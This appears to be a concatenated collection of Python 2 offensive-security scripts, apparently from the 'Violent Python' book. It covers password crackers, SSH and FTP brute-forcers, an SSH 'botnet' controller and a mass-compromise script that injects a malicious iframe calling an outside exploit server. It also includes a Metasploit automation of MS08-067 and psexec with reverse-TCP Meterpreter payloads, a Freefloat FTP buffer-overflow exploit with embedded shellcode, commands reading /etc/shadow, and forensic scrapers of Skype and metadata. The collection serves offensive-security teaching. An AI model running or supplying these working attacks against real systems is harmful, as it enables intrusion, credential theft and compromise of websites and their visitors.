__FILENAME__ = 1-vulnScanner
#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import os
import sys


def retBanner(ip, port):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner
    except:
        return


def checkVulns(banner, filename):

    f = open(filename, 'r')
    for line in f.readlines():
        if line.strip('\n') in banner:
            print '[+] Server is vulnerable: ' +\
                banner.strip('\n')


def main():

    if len(sys.argv) == 2:
        filename = sys.argv[1]
        if not os.path.isfile(filename):
            print '[-] ' + filename +\
                ' does not exist.'
            exit(0)

        if not os.access(filename, os.R_OK):
            print '[-] ' + filename +\
                ' access denied.'
            exit(0)
    else:   
        print '[-] Usage: ' + str(sys.argv[0]) +\
            ' <vuln filename>'
        exit(0)

    portList = [21,22,25,80,110,443]
    for x in range(147, 150):
        ip = '192.168.95.' + str(x)
        for port in portList:
            banner = retBanner(ip, port)
            if banner:
                print '[+] ' + ip + ' : ' + banner
                checkVulns(banner, filename)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 2-passwdCrack
#!/usr/bin/python
# -*- coding: utf-8 -*-
import crypt


def testPass(cryptPass):
    salt = cryptPass[0:2]
    dictFile = open('dictionary.txt', 'r')
    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptWord = crypt.crypt(word, salt)
        if cryptWord == cryptPass:
            print '[+] Found Password: ' + word + '\n'
            return
    print '[-] Password Not Found.\n'
    return


def main():
    passFile = open('passwords.txt')
    for line in passFile.readlines():
        if ':' in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print '[*] Cracking Password For: ' + user
            testPass(cryptPass)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 3-zipCrack
#!/usr/bin/python
# -*- coding: utf-8 -*-
import zipfile
import optparse
from threading import Thread


def extractFile(zFile, password):
    try:
        zFile.extractall(pwd=password)
        print '[+] Found password ' + password + '\n'
    except:
        pass


def main():
    parser = optparse.OptionParser("usage %prog "+\
      "-f <zipfile> -d <dictionary>")
    parser.add_option('-f', dest='zname', type='string',\
      help='specify zip file')
    parser.add_option('-d', dest='dname', type='string',\
      help='specify dictionary file')
    (options, args) = parser.parse_args()
    if (options.zname == None) | (options.dname == None):
        print parser.usage
        exit(0)
    else:
        zname = options.zname
        dname = options.dname

    zFile = zipfile.ZipFile(zname)
    passFile = open(dname)

    for line in passFile.readlines():
        password = line.strip('\n')
        t = Thread(target=extractFile, args=(zFile, password))
        t.start()


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 1-portScan
#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from socket import *
from threading import *

screenLock = Semaphore(value=1)

def connScan(tgtHost, tgtPort):
    try:
        connSkt = socket(AF_INET, SOCK_STREAM)
        connSkt.connect((tgtHost, tgtPort))
        connSkt.send('ViolentPython\r\n')
        results = connSkt.recv(100)
        screenLock.acquire()
        print '[+] %d/tcp open' % tgtPort
        print '[+] ' + str(results)
    except:
        screenLock.acquire()
        print '[-] %d/tcp closed' % tgtPort
    finally:
	screenLock.release()
	connSkt.close()	

def portScan(tgtHost, tgtPorts):
    try:
        tgtIP = gethostbyname(tgtHost)
    except:
        print "[-] Cannot resolve '%s': Unknown host" %tgtHost
        return

    try:
        tgtName = gethostbyaddr(tgtIP)
        print '\n[+] Scan Results for: ' + tgtName[0]
    except:
        print '\n[+] Scan Results for: ' + tgtIP

    setdefaulttimeout(1)
    for tgtPort in tgtPorts:
        t = Thread(target=connScan,args=(tgtHost,int(tgtPort)))
        t.start()

def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-H <target host> -p <target port>')
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string',\
      help='specify target port[s] separated by comma')

    (options, args) = parser.parse_args()

    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(',')

    if (tgtHost == None) | (tgtPorts[0] == None):
	print parser.usage
        exit(0)

    portScan(tgtHost, tgtPorts)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 2-nmapScan
import nmap
import optparse

def nmapScan(tgtHost,tgtPort):
    nmScan = nmap.PortScanner()
    nmScan.scan(tgtHost,tgtPort)
    state=nmScan[tgtHost]['tcp'][int(tgtPort)]['state']
    print "[*] " + tgtHost + " tcp/"+tgtPort +" "+state

def main():
    parser = optparse.OptionParser('usage %prog '+\
                                   '-H <target host> -p <target port>')
    parser.add_option('-H', dest='tgtHost', type='string',\
                      help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string',\
                      help='specify target port[s] separated by comma')
    
    (options, args) = parser.parse_args()
    
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(',')
    
    if (tgtHost == None) | (tgtPorts[0] == None):
        print parser.usage
        exit(0)
    for tgtPort in tgtPorts:
        nmapScan(tgtHost, tgtPort)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 3-botNet
#!/usr/bin/python
# -*- coding: utf-8 -*-
import optparse
import pxssh


class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output 


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)


botNet = []
addClient('127.0.0.1', 'root', 'toor')
addClient('127.0.0.1', 'root', 'toor')
addClient('127.0.0.1', 'root', 'toor')

botnetCommand('uname -v')
botnetCommand('cat /etc/issue')

########NEW FILE########
__FILENAME__ = 3-bruteKey
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pexpect
import optparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user,host,keyfile,release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user +\
          '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT,perm_denied,\
          ssh_newkey,conn_closed,'$','#',])
        if ret == 2:
            print '[-] Adding Host to ~/.ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print '[-] Connection Closed By Remote Host'
            Fails += 1
        elif ret > 3:
            print '[+] Success. ' + str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage %prog -H '+\
      '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',\
      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',\
      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)

    for filename in os.listdir(passDir):
        if Stop:
            print '[*] Exiting: Key Found.'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: '+\
              'Too Many Connections Closed By Remote Host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print '[-] Testing keyfile ' + str(fullpath)
        t = Thread(target=connect,\
          args=(user, host, fullpath, True))
        child = t.start()


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 3-pxsshCommand
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pxssh


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before


def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    except:
        print '[-] Error Connecting'
        exit(0)

s = connect('127.0.0.1', 'root', 'toor')
send_command(s, 'cat /etc/shadow | grep root')


########NEW FILE########
__FILENAME__ = 3-sshBrute
import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password Found: ' + password
	Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
	    Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
	elif 'synchronize with original prompt' in str(e):
	    time.sleep(1)
	    connect(host, user, password, False)

    finally:
	if release: connection_lock.release()

def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-H <target host> -u <user> -F <password list>'
                              )
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string',\
      help='specify password file')
    parser.add_option('-u', dest='user', type='string',\
      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)
        
    fn = open(passwdFile, 'r')
    for line in fn.readlines():

	if Found:
	    print "[*] Exiting: Password Found"
	    exit(0)
        if Fails > 5:
	    print "[!] Exiting: Too Many Socket Timeouts"
	    exit(0)

	connection_lock.acquire()
        password = line.strip('\r').strip('\n')
	print "[-] Testing: "+str(password)
        t = Thread(target=connect, args=(host, user,\
          password, True))
        child = t.start()

if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 3-sshCommand
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pexpect

PROMPT = ['# ', '>>> ', '> ','\$ ']

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,\
                        '[P|p]assword:'])
    
    if ret == 0:
        print '[-] Error Connecting'
        return
    
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, \
                            '[P|p]assword:'])
        if ret == 0:
            print '[-] Error Connecting'
            return
    
    child.sendline(password)
    child.expect(PROMPT)
    return child


def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'
    
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 4-anonLogin
#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) +\
          ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) +\
	  ' FTP Anonymous Logon Failed.'
	return False


host = '192.168.95.179'
anonLogin(host)

########NEW FILE########
__FILENAME__ = 4-bruteLogin
#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib, time

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
	time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
	print "[+] Trying: "+userName+"/"+passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) +\
	      ' FTP Logon Succeeded: '+userName+"/"+passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)


host = '192.168.95.179'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)

########NEW FILE########
__FILENAME__ = 4-defaultPages
#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib


def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + fileName
        retList.append(fileName)
    return retList


host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
returnDefault(ftp)

########NEW FILE########
__FILENAME__ = 4-injectPage
#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page

    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page


host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src='+\
  '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)

########NEW FILE########
__FILENAME__ = 4-massCompromise
#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib
import optparse
import time


def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) \
            + ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n[-] ' + str(hostname) +\
          ' FTP Anonymous Logon Failed.'
        return False


def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: ' + userName + '/' + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) +\
              ' FTP Logon Succeeded: '+userName+'/'+passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)


def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list directory contents.'
        print '[-] Skipping To Next Target.'
        return

    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + fileName
        retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page

    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page


def attack(username,password,tgtHost,redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-H <target host[s]> -r <redirect page>'+\
      '[-f <userpass file>]')
    
    parser.add_option('-H', dest='tgtHosts',\
      type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile',\
      type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect',\
      type='string',help='specify a redirection page')

    (options, args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect

    if tgtHosts == None or redirect == None:
        print parser.usage
        exit(0)

    for tgtHost in tgtHosts:
        username = None
        password = None

        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using Anonymous Creds to attack'
            attack(username, password, tgtHost, redirect)
      
        elif passwdFile != None:
            (username, password) =\
              bruteLogin(tgtHost, passwdFile)
            if password != None:
                '[+] Using Creds: ' +\
                  username + '/' + password + ' to attack'
                attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 5-conficker
#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import optparse
import sys
import nmap


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+\
      'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload '+\
      'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload '+\
          'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')

    parser = optparse.OptionParser('[-] Usage %prog '+\
      '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',\
      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',\
      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',\
      help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',\
      help='password file for SMB brute force attempt')

    (options, args) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print parser.usage
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)

    setupHandler(configFile, lhost, lport)

    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile,tgtHost,passwdFile,lhost,lport)

    configFile.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 6-freeFloat
#!/usr/bin/Python
#Title: Freefloat FTP 1.0 Non Implemented Command Buffer Overflows
#Author: Craig Freyman (@cd1zz)
#Date: July 19, 2011
#Tested on Windows XP SP3 English
#Part of FreeFloat pwn week
#Vendor Notified: 7-18-2011 (no response)
#Software Link: http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php

import socket,sys,time,struct

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> <command>" % sys.argv[0] + "\r"
     print "[-]For example [filename.py 192.168.1.10 PWND] would do the trick."
     print "[-]Other options: AUTH, APPE, ALLO, ACCT"
     sys.exit(0)

target = sys.argv[1]
command = sys.argv[2]

if len(sys.argv) > 2:
     platform = sys.argv[2]

#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9" 
"\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f" 
"\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8" 
"\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7" 
"\xdb\x70\xe2\x64\x1f\x12\x9e\x76\x73\xf4\x9f\xb8\x86\xf5" 
"\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c" 
"\x56\x22\x1c\x43\x22\x98\x1f\x94\x9a\x97\x68\x0c\x91\xf0" 
"\x48\x2d\x76\xe3\xb5\x64\xf3\xd0\x4e\x77\xd5\x28\xae\x49" 
"\x19\xe6\x91\x65\x94\xf6\xd6\x42\x46\x8d\x2c\xb1\xfb\x96" 
"\xf6\xcb\x27\x12\xeb\x6c\xac\x84\xcf\x8d\x61\x52\x9b\x82" 
"\xce\x10\xc3\x86\xd1\xf5\x7f\xb2\x5a\xf8\xaf\x32\x18\xdf" 
"\x6b\x1e\xfb\x7e\x2d\xfa\xaa\x7f\x2d\xa2\x13\xda\x25\x41" 
"\x40\x5c\x64\x0e\xa5\x53\x97\xce\xa1\xe4\xe4\xfc\x6e\x5f" 
"\x63\x4d\xe7\x79\x74\xb2\xd2\x3e\xea\x4d\xdc\x3e\x22\x8a" 
"\x88\x6e\x5c\x3b\xb0\xe4\x9c\xc4\x65\xaa\xcc\x6a\xd5\x0b" 
"\xbd\xca\x85\xe3\xd7\xc4\xfa\x14\xd8\x0e\x8d\x12\x16\x6a" 
"\xde\xf4\x5b\x8c\xf1\x58\xd5\x6a\x9b\x70\xb3\x25\x33\xb3" 
"\xe0\xfd\xa4\xcc\xc2\x51\x7d\x5b\x5a\xbc\xb9\x64\x5b\xea" 
"\xea\xc9\xf3\x7d\x78\x02\xc0\x9c\x7f\x0f\x60\xd6\xb8\xd8" 
"\xfa\x86\x0b\x78\xfa\x82\xfb\x19\x69\x49\xfb\x54\x92\xc6" 
"\xac\x31\x64\x1f\x38\xac\xdf\x89\x5e\x2d\xb9\xf2\xda\xea" 
"\x7a\xfc\xe3\x7f\xc6\xda\xf3\xb9\xc7\x66\xa7\x15\x9e\x30" 
"\x11\xd0\x48\xf3\xcb\x8a\x27\x5d\x9b\x4b\x04\x5e\xdd\x53" 
"\x41\x28\x01\xe5\x3c\x6d\x3e\xca\xa8\x79\x47\x36\x49\x85" 
"\x92\xf2\x79\xcc\xbe\x53\x12\x89\x2b\xe6\x7f\x2a\x86\x25" 
"\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10" 
"\xba\x1e\x53\x31")

#7C874413   FFE4             JMP ESP kernel32.dll
ret = struct.pack('<L', 0x7C874413)
padding = "\x90" * 150
crash = "\x41" * 246 + ret + padding + shellcode

print "\
[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow\n\
[*] Author: Craig Freyman (@cd1zz)\n\
[*] Connecting to "+target

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target+" failed!"
    sys.exit(0)

print "[*] Sending " + `len(crash)` + " " + command +" byte crash..."

s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command +" " + crash + "\r\n")
time.sleep(4)

########NEW FILE########
__FILENAME__ = 1-discoverNetworks
#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import optparse
import mechanize
import urllib
import re
import urlparse
from _winreg import *


def val2addr(val):
    addr = ''
    for ch in val:
        addr += '%02x ' % ord(ch)
    addr = addr.strip(' ').replace(' ', ':')[0:17]
    return addr


def wiglePrint(username, password, netid):
    browser = mechanize.Browser()
    browser.open('http://wigle.net')
    reqData = urllib.urlencode({'credential_0': username,
                               'credential_1': password})
    browser.open('https://wigle.net/gps/gps/main/login', reqData)
    params = {}
    params['netid'] = netid
    reqParams = urllib.urlencode(params)
    respURL = 'http://wigle.net/gps/gps/main/confirmquery/'
    resp = browser.open(respURL, reqParams).read()
    mapLat = 'N/A'
    mapLon = 'N/A'
    rLat = re.findall(r'maplat=.*\&', resp)
    if rLat:
        mapLat = rLat[0].split('&')[0].split('=')[1]
    rLon = re.findall(r'maplon=.*\&', resp)
    if rLon:
        mapLon = rLon[0].split
    print '[-] Lat: ' + mapLat + ', Lon: ' + mapLon


def printNets(username, password):
    net = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"+\
          "\NetworkList\Signatures\Unmanaged"
    key = OpenKey(HKEY_LOCAL_MACHINE, net)
    print '\n[*] Networks You have Joined.'
    for i in range(100):
        try:
            guid = EnumKey(key, i)
            netKey = OpenKey(key, str(guid))
            (n, addr, t) = EnumValue(netKey, 5)
            (n, name, t) = EnumValue(netKey, 4)
            macAddr = val2addr(addr)
            netName = str(name)
            print '[+] ' + netName + '  ' + macAddr
            wiglePrint(username, password, macAddr)
            CloseKey(netKey)
        except:
            break


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-u <wigle username> -p <wigle password>')
    parser.add_option('-u', dest='username', type='string',
                      help='specify wigle password')
    parser.add_option('-p', dest='password', type='string',
                      help='specify wigle username')
    (options, args) = parser.parse_args()
    username = options.username
    password = options.password
    if username == None or password == None:
        print parser.usage
        exit(0)
    else:
        printNets(username, password)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 2-dumpRecycleBin
#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import optparse
from _winreg import *


def sid2user(sid):
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,
       "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
       + '\\' + sid)
        (value, type) = QueryValueEx(key, 'ProfileImagePath')
        user = value.split('\\')[-1]
        return user
    except:
        return sid


def returnDir():
    dirs=['C:\\Recycler\\','C:\\Recycled\\','C:\\$Recycle.Bin\\']
    for recycleDir in dirs:
        if os.path.isdir(recycleDir):
            return recycleDir
    return None


def findRecycled(recycleDir):
    dirList = os.listdir(recycleDir)
    for sid in dirList:
        files = os.listdir(recycleDir + sid)
        user = sid2user(sid)
        print '\n[*] Listing Files For User: ' + str(user)
        for file in files:
            print '[+] Found File: ' + str(file)


def main():
    recycledDir = returnDir()
    findRecycled(recycledDir)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 3-pdfRead
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pyPdf
import optparse
from pyPdf import PdfFileReader


def printMeta(fileName):
    pdfFile = PdfFileReader(file(fileName, 'rb'))
    docInfo = pdfFile.getDocumentInfo()
    print '[*] PDF MetaData For: ' + str(fileName)
    for metaItem in docInfo:
        print '[+] ' + metaItem + ':' + docInfo[metaItem]


def main():
    parser = optparse.OptionParser('usage %prog "+\
      "-F <PDF file name>')
    parser.add_option('-F', dest='fileName', type='string',\
      help='specify PDF file name')

    (options, args) = parser.parse_args()
    fileName = options.fileName
    if fileName == None:
        print parser.usage
        exit(0)
    else:
        printMeta(fileName)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 4-exifFetch
#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import optparse
from urlparse import urlsplit
from os.path import basename
from bs4 import BeautifulSoup
from PIL import Image
from PIL.ExifTags import TAGS


def findImages(url):
    print '[+] Finding images on ' + url
    urlContent = urllib2.urlopen(url).read()
    soup = BeautifulSoup(urlContent)
    imgTags = soup.findAll('img')
    return imgTags


def downloadImage(imgTag):
    try:
        print '[+] Dowloading image...'
        imgSrc = imgTag['src']
        imgContent = urllib2.urlopen(imgSrc).read()
        imgFileName = basename(urlsplit(imgSrc)[2])
        imgFile = open(imgFileName, 'wb')
        imgFile.write(imgContent)
        imgFile.close()
        return imgFileName
    except:
        return ''


def testForExif(imgFileName):
    try:
        exifData = {}
        imgFile = Image.open(imgFileName)
        info = imgFile._getexif()
        if info:
            for (tag, value) in info.items():
                decoded = TAGS.get(tag, tag)
                exifData[decoded] = value
            exifGPS = exifData['GPSInfo']
            if exifGPS:
                print '[*] ' + imgFileName + \
                 ' contains GPS MetaData'
    except:
        pass


def main():
    parser = optparse.OptionParser('usage %prog "+\
      "-u <target url>')
    parser.add_option('-u', dest='url', type='string',
      help='specify url address')

    (options, args) = parser.parse_args()
    url = options.url
    if url == None:
        print parser.usage
        exit(0)
    else:
        imgTags = findImages(url)
        for imgTag in imgTags:
            imgFileName = downloadImage(imgTag)
            testForExif(imgFileName)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 5-skypeParse
#!/usr/bin/python
# -*- coding: utf-8 -*-
import sqlite3
import optparse
import os


def printProfile(skypeDB):
    conn = sqlite3.connect(skypeDB)
    c = conn.cursor()
    c.execute("SELECT fullname, skypename, city, country, \
      datetime(profile_timestamp,'unixepoch') FROM Accounts;")

    for row in c:
        print '[*] -- Found Account --'
        print '[+] User           : '+str(row[0])
        print '[+] Skype Username : '+str(row[1])
        print '[+] Location       : '+str(row[2])+','+str(row[3])
        print '[+] Profile Date   : '+str(row[4])


def printContacts(skypeDB):
    conn = sqlite3.connect(skypeDB)
    c = conn.cursor()
    c.execute("SELECT displayname, skypename, city, country,\
      phone_mobile, birthday FROM Contacts;")

    for row in c:
        print '\n[*] -- Found Contact --'
        print '[+] User           : ' + str(row[0])
        print '[+] Skype Username : ' + str(row[1])

        if str(row[2]) != '' and str(row[2]) != 'None':
            print '[+] Location       : ' + str(row[2]) + ',' \
                + str(row[3])
        if str(row[4]) != 'None':
            print '[+] Mobile Number  : ' + str(row[4])
        if str(row[5]) != 'None':
            print '[+] Birthday       : ' + str(row[5])


def printCallLog(skypeDB):
    conn = sqlite3.connect(skypeDB)
    c = conn.cursor()
    c.execute("SELECT datetime(begin_timestamp,'unixepoch'), \
      identity FROM calls, conversations WHERE \
      calls.conv_dbid = conversations.id;"
              )
